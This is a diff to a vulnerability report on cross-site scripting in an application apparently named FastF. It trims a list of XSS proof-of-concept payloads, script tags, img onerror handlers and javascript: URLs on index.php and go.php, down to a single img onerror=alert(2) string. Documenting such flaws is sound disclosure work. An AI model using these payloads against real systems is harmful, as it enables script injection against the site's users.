@@ -160,15 +160,9 @@ Multiple Cross-Site Scripting (XSS) vulnerabilities were identified in the FastF
 
 #### Vulnerable Endpoints
 ```
-XSS INJECTION POINTS:
-├── index.php Parameter Injection:
-│   ├── ?act=--%3E%3Cscript%3Ealert(2)%3C%2Fscript [200 OK]
-│   ├── ?act=--%3E%3Cimg%20src=x%20onerror=alert(2) [200 OK]
-│   └── ?act=--%3E%3Cb%3Elogintesttest%3C%2Fb%3E [200 OK]
-└── go.php JavaScript Protocol:
-    ├── ?returnUrl=javascript:alert(2)&type=1 [200 OK]
-    ├── ?returnUrl=javascript:alert(3333)&type=1 [200 OK]
-    └── ?returnUrl=javascript:alert(anjay)&type=1 [200 OK]
+XSS INJECTION POINT:
+└── index.php Parameter Injection:
+    └── ?act=--%3E%3Cimg%20src=x%20onerror=alert(2) [200 OK]
 ```
 
 #### Impact
